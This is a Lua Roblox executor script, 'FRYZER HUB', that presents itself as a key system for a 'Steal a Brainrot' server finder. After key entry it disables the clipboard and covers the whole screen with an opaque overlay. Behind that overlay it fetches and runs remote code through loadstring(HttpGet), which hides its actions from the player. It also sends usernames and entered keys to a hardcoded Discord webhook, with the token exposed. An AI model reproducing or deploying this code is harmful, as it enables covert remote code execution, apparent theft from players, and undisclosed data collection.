-- FRYZER HUB Key System
-- Simple URL-based key verification with Discord webhook

--! Configuration
local KEY_CHECK_URL = "https://raw.githubusercontent.com/FryzerHub/keyes/refs/heads/main/System%20key"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1420595470564069456/vyveVpLr-CdqDvAmHq49DOM1TJ7l9LiuUWzHLtUwzBkdtPkL7DUH4d3_E5BWJBxEj6xU"
local GET_KEY_URL = "https://lootdest.org/s?qE4dIEw2" -- Replace with your actual get key link
local DISCORD_INVITE = "https://discord.gg/SYHphHCq9a" -- Replace with your actual Discord invite

--! Your Main Script Function - REPLACE THIS WITH YOUR ACTUAL CODE
local function executeMainScript()
    -- PUT YOUR MAIN SCRIPT CODE HERE

    
local GameID = 109983668079237  -- your target game ID
local PlaceID = game.PlaceId

if PlaceID == GameID then
    -- ‚úÖ Script will run here (only in your game)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Steal a Brainrot";
        Text = "‚úÖ Script loaded successfully!";
        Duration = 5;
    })

-- Store original setclipboard
local realSetClipboard = setclipboard

-- Block setclipboard
setclipboard = function(...)
    return
end

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BlockerGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.DisplayOrder = 999999999
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = game:GetService("CoreGui")

-- Create Background Frame (covers entire screen including all insets)
local Background = Instance.new("Frame")
Background.Name = "Background"
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.AnchorPoint = Vector2.new(0, 0)
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Background.BorderSizePixel = 0
Background.ZIndex = 999999999
Background.Active = true
Background.Parent = ScreenGui

-- Keep background covering screen even on resize
game:GetService("RunService").RenderStepped:Connect(function()
    Background.Size = UDim2.new(1, 100, 1, 100)
    Background.Position = UDim2.new(0, -50, 0, -50)
end)

-- Create Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 400, 0, 250)
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 999999999
MainFrame.Parent = Background

-- Add UICorner to MainFrame
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- Create Title
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -40, 0, 50)
Title.Position = UDim2.new(0, 20, 0, 20)
Title.BackgroundTransparency = 1
Title.Text = "Loading Script..."
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 24
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.ZIndex = 999999999
Title.Parent = MainFrame

-- Create Timer Label
local TimerLabel = Instance.new("TextLabel")
TimerLabel.Name = "TimerLabel"
TimerLabel.Size = UDim2.new(1, -40, 0, 40)
TimerLabel.Position = UDim2.new(0, 20, 0, 85)
TimerLabel.BackgroundTransparency = 1
TimerLabel.Text = "Starting in: 10s"
TimerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TimerLabel.TextSize = 18
TimerLabel.Font = Enum.Font.Gotham
TimerLabel.TextXAlignment = Enum.TextXAlignment.Center
TimerLabel.ZIndex = 999999999
TimerLabel.Parent = MainFrame

-- Create Discord Button
local DiscordButton = Instance.new("TextButton")
DiscordButton.Name = "DiscordButton"
DiscordButton.Size = UDim2.new(1, -40, 0, 45)
DiscordButton.Position = UDim2.new(0, 20, 0, 145)
DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
DiscordButton.BorderSizePixel = 0
DiscordButton.Text = "Copy Discord Link"
DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.TextSize = 16
DiscordButton.Font = Enum.Font.GothamBold
DiscordButton.ZIndex = 999999999
DiscordButton.Parent = MainFrame

-- Add UICorner to Button
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = DiscordButton

-- Discord button functionality
DiscordButton.MouseButton1Click:Connect(function()
    realSetClipboard("https://discord.gg/SYHphHCq9a") -- Replace with your actual Discord link
    DiscordButton.Text = "Copied!"
    wait(1.5)
    DiscordButton.Text = "Copy Discord Link"
end)

-- Timer countdown
local timeLeft = 10
task.spawn(function()
    for i = timeLeft, 1, -1 do
        TimerLabel.Text = "Starting in: " .. i .. "s"
        wait(1)
    end
    
    TimerLabel.Text = "Script Loaded!"
    Title.Text = "Running..."
    wait(0.5)
    
    -- Run the loadstring (GUI stays visible)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yoursvexyyy/VEX-OP/refs/heads/main/free%20server%20finder"))()
end)

else
    -- üö´ Not the correct game
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Error ‚ùå";
        Text = "This script only works in 'Steal a Brainrot'!";
        Duration = 6;
    })
    return
end

    local StarterGui = game:GetService("StarterGui")
    StarterGui:SetCore("SendNotification", {
        Title = "FRYZER HUB";
        Text = "Successfully loaded!";
        Duration = 5;
    })
end

--! Wait for game to load
repeat task.wait(1) until game:IsLoaded()

--! Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--! Utility Functions
local fSetClipboard = setclipboard or toclipboard
local fRequest = request or http_request or syn_request

--! Key System Functions
local function sendWebhook(username, key, status)
    local success, result = pcall(function()
        local currentTime = os.date("%Y-%m-%d %H:%M:%S UTC", os.time())
        
        local embedData = {
            ["embeds"] = {{
                ["title"] = "üîë Key Verification",
                ["color"] = status and 65280 or 16711680, -- Green for success, red for failure
                ["fields"] = {
                    {
                        ["name"] = "üë§ Username",
                        ["value"] = username,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üîë Key Used",
                        ["value"] = key,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üìä Status",
                        ["value"] = status and "‚úÖ Success" or "‚ùå Failed",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "‚è∞ Time",
                        ["value"] = currentTime,
                        ["inline"] = false
                    }
                },
                ["footer"] = {
                    ["text"] = "FRYZER HUB Key System"
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        
        return fRequest({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(embedData)
        })
    end)
    
    if not success then
        warn("[FRYZER HUB] Failed to send webhook:", result)
    end
end

local function checkKey(inputKey)
    local success, result = pcall(function()
        local response = fRequest({
            Url = KEY_CHECK_URL,
            Method = "GET"
        })
        
        if response.StatusCode == 200 then
            local validKeys = {}
            -- Split the response by lines and clean each key
            for key in string.gmatch(response.Body, "[^\r\n]+") do
                local cleanKey = string.gsub(key, "%s+", "") -- Remove whitespace
                if cleanKey ~= "" then
                    table.insert(validKeys, cleanKey)
                end
            end
            
            -- Check if the input key matches any valid key
            local cleanInputKey = string.gsub(inputKey, "%s+", "")
            for _, validKey in ipairs(validKeys) do
                if cleanInputKey == validKey then
                    return true, "Key verified successfully!"
                end
            end
            
            return false, "Invalid key"
        else
            return false, "Failed to connect to key server"
        end
    end)
    
    if success then
        return result
    else
        return false, "Error checking key: " .. tostring(result)
    end
end

--! GUI Creation
-- GUI Configuration
local GUI_SIZE = UDim2.new(0, 400, 0, 220)
local BLACK = Color3.fromRGB(0, 0, 0)
local WHITE = Color3.fromRGB(255, 255, 255)
local DARK_GRAY = Color3.fromRGB(20, 20, 20)
local LIGHT_GRAY = Color3.fromRGB(240, 240, 240)
local MEDIUM_GRAY = Color3.fromRGB(128, 128, 128)

-- Remove existing GUI
if playerGui:FindFirstChild("MinimalKeyGUI") then
    playerGui.MinimalKeyGUI:Destroy()
end

-- Create main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MinimalKeyGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main container
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = GUI_SIZE
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
mainFrame.BackgroundColor3 = BLACK
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- White border frame
local borderFrame = Instance.new("Frame")
borderFrame.Name = "BorderFrame"
borderFrame.Size = UDim2.new(1, 6, 1, 6)
borderFrame.Position = UDim2.new(0, -3, 0, -3)
borderFrame.BackgroundColor3 = WHITE
borderFrame.BorderSizePixel = 0
borderFrame.ZIndex = -1
borderFrame.Parent = mainFrame

-- Title section
local titleSection = Instance.new("Frame")
titleSection.Name = "TitleSection"
titleSection.Size = UDim2.new(1, 0, 0, 60)
titleSection.Position = UDim2.new(0, 0, 0, 0)
titleSection.BackgroundColor3 = WHITE
titleSection.BorderSizePixel = 0
titleSection.Parent = mainFrame

-- Title text
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, -40, 1, 0)
titleLabel.Position = UDim2.new(0, 20, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "FRYZER HUB"
titleLabel.TextColor3 = BLACK
titleLabel.TextSize = 24
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = titleSection

-- Separator line
local separator = Instance.new("Frame")
separator.Name = "Separator"
separator.Size = UDim2.new(1, -40, 0, 1)
separator.Position = UDim2.new(0, 20, 1, -1)
separator.BackgroundColor3 = BLACK
separator.BorderSizePixel = 0
separator.Parent = titleSection

-- Content area
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -40, 1, -80)
contentFrame.Position = UDim2.new(0, 20, 0, 70)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Status label
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "Status"
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 0, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Enter your access key"
statusLabel.TextColor3 = WHITE
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.SourceSans
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = contentFrame

-- Input container
local inputContainer = Instance.new("Frame")
inputContainer.Name = "InputContainer"
inputContainer.Size = UDim2.new(1, 0, 0, 40)
inputContainer.Position = UDim2.new(0, 0, 0, 30)
inputContainer.BackgroundColor3 = BLACK
inputContainer.BorderSizePixel = 0
inputContainer.Parent = contentFrame

-- Input border
local inputBorder = Instance.new("Frame")
inputBorder.Name = "InputBorder"
inputBorder.Size = UDim2.new(1, 2, 1, 2)
inputBorder.Position = UDim2.new(0, -1, 0, -1)
inputBorder.BackgroundColor3 = WHITE
inputBorder.BorderSizePixel = 0
inputBorder.ZIndex = -1
inputBorder.Parent = inputContainer

-- Key input box
local keyBox = Instance.new("TextBox")
keyBox.Name = "KeyBox"
keyBox.Size = UDim2.new(1, -20, 1, 0)
keyBox.Position = UDim2.new(0, 10, 0, 0)
keyBox.BackgroundTransparency = 1
keyBox.Text = ""
keyBox.PlaceholderText = "Paste key here..."
keyBox.TextColor3 = WHITE
keyBox.PlaceholderColor3 = MEDIUM_GRAY
keyBox.TextSize = 16
keyBox.Font = Enum.Font.SourceSans
keyBox.ClearTextOnFocus = false
keyBox.TextXAlignment = Enum.TextXAlignment.Left
keyBox.ClipsDescendants = true
keyBox.Parent = inputContainer

-- Button container
local buttonFrame = Instance.new("Frame")
buttonFrame.Name = "ButtonFrame"
buttonFrame.Size = UDim2.new(1, 0, 0, 40)
buttonFrame.Position = UDim2.new(0, 0, 0, 85)
buttonFrame.BackgroundTransparency = 1
buttonFrame.Parent = contentFrame

-- Function to create buttons
local function createButton(name, text, position, isBlack)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(0.3, -5, 1, 0)
    button.Position = position
    button.BackgroundColor3 = isBlack and BLACK or WHITE
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = isBlack and WHITE or BLACK
    button.TextSize = 14
    button.Font = Enum.Font.SourceSansBold
    button.Parent = buttonFrame
    
    -- Button border
    local buttonBorder = Instance.new("Frame")
    buttonBorder.Name = "Border"
    buttonBorder.Size = UDim2.new(1, 2, 1, 2)
    buttonBorder.Position = UDim2.new(0, -1, 0, -1)
    buttonBorder.BackgroundColor3 = isBlack and WHITE or BLACK
    buttonBorder.BorderSizePixel = 0
    buttonBorder.ZIndex = -1
    buttonBorder.Parent = button
    
    return button
end

-- Create buttons
local getKeyButton = createButton("GetKeyButton", "GET KEY", UDim2.new(0, 0, 0, 0), true)
local verifyButton = createButton("VerifyButton", "VERIFY", UDim2.new(0.35, 0, 0, 0), false)
local discordButton = createButton("DiscordButton", "DISCORD", UDim2.new(0.7, 0, 0, 0), true)

-- Progress indicator
local progressContainer = Instance.new("Frame")
progressContainer.Name = "ProgressContainer"
progressContainer.Size = UDim2.new(1, 0, 0, 3)
progressContainer.Position = UDim2.new(0, 0, 1, -10)
progressContainer.BackgroundColor3 = DARK_GRAY
progressContainer.BorderSizePixel = 0
progressContainer.Visible = false
progressContainer.Parent = contentFrame

local progressBar = Instance.new("Frame")
progressBar.Name = "ProgressBar"
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = WHITE
progressBar.BorderSizePixel = 0
progressBar.Parent = progressContainer

-- Animation functions
local function fadeText(element, transparency, duration)
    return TweenService:Create(
        element,
        TweenInfo.new(duration or 0.3, Enum.EasingStyle.Quad),
        {TextTransparency = transparency}
    )
end

local function updateStatus(message, isError, showProgress)
    statusLabel.Text = message
    statusLabel.TextColor3 = isError and LIGHT_GRAY or WHITE
    
    if showProgress then
        progressContainer.Visible = true
        progressBar.Size = UDim2.new(0, 0, 1, 0)
        
        local tween = TweenService:Create(
            progressBar,
            TweenInfo.new(2, Enum.EasingStyle.Linear),
            {Size = UDim2.new(1, 0, 1, 0)}
        )
        tween:Play()
        tween.Completed:Connect(function()
            task.wait(0.5)
            progressContainer.Visible = false
        end)
    else
        progressContainer.Visible = false
    end
end

-- Button hover effects
local function setupButton(button, isBlack)
    local originalBg = button.BackgroundColor3
    local originalText = button.TextColor3
    local hoverBg = isBlack and DARK_GRAY or LIGHT_GRAY
    
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverBg}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalBg}):Play()
    end)
    
    button.MouseButton1Down:Connect(function()
        local flashTween = TweenService:Create(
            button,
            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, true),
            {BackgroundColor3 = isBlack and WHITE or BLACK, TextColor3 = isBlack and BLACK or WHITE}
        )
        flashTween:Play()
    end)
end

-- Input focus effects
keyBox.Focused:Connect(function()
    TweenService:Create(inputBorder, TweenInfo.new(0.2), {BackgroundColor3 = LIGHT_GRAY}):Play()
end)

keyBox.FocusLost:Connect(function(enterPressed)
    TweenService:Create(inputBorder, TweenInfo.new(0.2), {BackgroundColor3 = WHITE}):Play()
    if enterPressed then
        verifyButton.MouseButton1Click:Fire()
    end
end)

-- Setup button effects
setupButton(getKeyButton, true)
setupButton(verifyButton, false)
setupButton(discordButton, true)

-- Button functionality
getKeyButton.MouseButton1Click:Connect(function()
    updateStatus("Opening get key page...", false, true)
    
    spawn(function()
        local success = pcall(function()
            -- Copy the get key link to clipboard
            fSetClipboard(GET_KEY_URL)
        end)
        
        if success then
            updateStatus("Get key link copied to clipboard!", false)
        else
            updateStatus("Get key link: " .. GET_KEY_URL, false)
        end
        
        -- Optional: Send webhook notification when someone requests a key
        pcall(function()
            local embedData = {
                ["embeds"] = {{
                    ["title"] = "üîó Get Key Request",
                    ["color"] = 3447003, -- Blue color
                    ["fields"] = {
                        {
                            ["name"] = "üë§ Username",
                            ["value"] = player.Name,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "üì± Action",
                            ["value"] = "Requested get key link",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "‚è∞ Time",
                            ["value"] = os.date("%Y-%m-%d %H:%M:%S UTC", os.time()),
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "FRYZER HUB Key System"
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            }
            
            fRequest({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(embedData)
            })
        end)
    end)
end)

verifyButton.MouseButton1Click:Connect(function()
    local key = keyBox.Text:gsub("%s+", "")
    
    if key == "" then
        updateStatus("Please enter a key", true)
        return
    end
    
    updateStatus("Verifying access...", false, true)
    
    spawn(function()
        local success, message = checkKey(key)
        
        -- Send webhook notification
        sendWebhook(player.Name, key, success)
        
        if success then
            updateStatus("Access granted!", false)
            task.wait(1)
            
            -- Clean fade out animation
            local fadeOut = TweenService:Create(
                mainFrame,
                TweenInfo.new(0.5, Enum.EasingStyle.Quad),
                {BackgroundTransparency = 1}
            )
            
            local borderFadeOut = TweenService:Create(
                borderFrame,
                TweenInfo.new(0.5, Enum.EasingStyle.Quad),
                {BackgroundTransparency = 1}
            )
            
            local titleFadeOut = TweenService:Create(
                titleSection,
                TweenInfo.new(0.5, Enum.EasingStyle.Quad),
                {BackgroundTransparency = 1}
            )
            
            fadeOut:Play()
            borderFadeOut:Play()
            titleFadeOut:Play()
            fadeText(titleLabel, 1, 0.5):Play()
            fadeText(statusLabel, 1, 0.5):Play()
            
            fadeOut.Completed:Connect(function()
                screenGui:Destroy()
                executeMainScript()
            end)
        else
            updateStatus(message or "Invalid key", true)
        end
    end)
end)

discordButton.MouseButton1Click:Connect(function()
    updateStatus("Opening Discord invite...", false, true)
    
    spawn(function()
        local success = pcall(function()
            fSetClipboard(DISCORD_INVITE)
        end)
        
        if success then
            updateStatus("Discord invite copied to clipboard!", false)
        else
            updateStatus("Discord: " .. DISCORD_INVITE, false)
        end
        
        -- Optional: Send webhook notification when someone requests Discord invite
        pcall(function()
            local embedData = {
                ["embeds"] = {{
                    ["title"] = "üí¨ Discord Invite Request",
                    ["color"] = 7506394, -- Discord blurple color
                    ["fields"] = {
                        {
                            ["name"] = "üë§ Username",
                            ["value"] = player.Name,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "üì± Action",
                            ["value"] = "Requested Discord invite",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "‚è∞ Time",
                            ["value"] = os.date("%Y-%m-%d %H:%M:%S UTC", os.time()),
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "FRYZER HUB Key System"
                    },
                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            }
            
            fRequest({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(embedData)
            })
        end)
    end)
end)

-- Simple entry animation
mainFrame.BackgroundTransparency = 1
titleSection.BackgroundTransparency = 1
borderFrame.BackgroundTransparency = 1
titleLabel.TextTransparency = 1
statusLabel.TextTransparency = 1

-- Animate GUI appearance
TweenService:Create(mainFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
TweenService:Create(titleSection, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
TweenService:Create(borderFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()

task.wait(0.1)
fadeText(titleLabel, 0, 0.3):Play()
task.wait(0.1)
fadeText(statusLabel, 0, 0.3):Play()

-- Dragging functionality
local dragging = false
local dragInput = nil
local dragStart = nil
local startPos = nil

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)

-- Initial status
updateStatus("Enter your access key", false)

print("[FRYZER HUB] Key system loaded successfully!")
print("[FRYZER HUB] Ready for key verification!")
